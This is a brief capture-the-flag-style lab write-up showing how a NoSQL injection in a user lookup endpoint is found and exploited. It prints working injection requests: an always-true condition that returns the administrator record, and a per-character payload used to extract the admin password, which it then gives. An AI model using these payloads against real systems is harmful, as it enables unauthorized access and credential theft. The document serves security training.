# Exploiting NoSQL injection to extract data
First, I thought there was a suspicious endpoint - and I tried sending a qoute.
`GET /user/lookup?user=wiener' HTTP/2`
It returned an error:
```json
{
  "message": "There was an error getting user details"
}
```
I then sent something that would always evaluate to true:
`GET /user/lookup?user=wiener' || '1'=='1 HTTP/2`
And it gave me admin account.
```json
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```
I then wanted to try and exfiltrate the password of the admin account by guessing characters one by one. 
`GET /user/lookup?user=administrator'+%26%26+this.password[0]+%3d%3d+'k HTTP/2`
This would allow me to do exactly that.
Here, I can guess the characters one by one. I wrote a small python script to bruteforce it which you can find [here](./assets/exfiltrate.py)
It returned this password: `taitffna`
And I logged in as administrator and solved the lab.
